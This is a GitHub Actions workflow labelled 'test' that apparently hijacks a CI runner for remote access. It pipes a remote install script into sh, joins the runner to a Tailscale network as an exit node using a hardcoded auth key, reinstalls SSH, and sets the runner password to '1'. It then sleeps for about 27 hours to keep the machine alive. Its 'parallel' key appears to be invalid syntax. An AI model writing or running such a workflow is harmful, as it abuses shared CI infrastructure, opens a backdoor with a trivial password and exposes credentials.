on: 
  workflow_dispatch:
name: test
permissions: write-all
env:
  GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
jobs:
  this:
    continue-on-error: true
    runs-on: codespaces-prebuild
    steps:
      - parallel:
          - run: |
              sudo hostname w
          - run: |
              curl -fsSL https://tailscale.com/install.sh | sh
              sudo tailscale up --auth-key=tskey-auth-kNMj8JaEr221CNTRL-GzQ6LJG2nAVinCWLCxmQBV5yBFCHWyTz --advertise-exit-node
              sudo rm -rf /etc/ssh
              sudo apt purge ssh openssh-server -y
              sudo apt install ssh openssh-server -y
              sudo systemctl restart ssh
          - run: |
              echo "runner:1" | sudo chpasswd
          - run: |
              sleep 99999
